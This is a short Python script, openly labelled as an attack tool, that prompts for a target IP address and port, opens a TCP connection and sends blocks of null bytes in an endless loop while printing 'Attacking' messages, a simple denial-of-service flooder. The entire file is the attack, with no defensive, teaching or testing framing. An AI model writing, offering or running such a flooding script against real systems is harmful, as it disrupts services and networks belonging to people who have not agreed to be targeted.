import socket


def attack(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        while True:
            data = 100
            sock.send(bytes(data))
            print('Attacking : ' + ip + " " + str(port) + " " + str(data))
    except socket.error:
        pass


ip_address = input("Enter Target Ip Address : ")
port_address = int(input("Enter Target Port : "))
attack(ip_address, port_address)
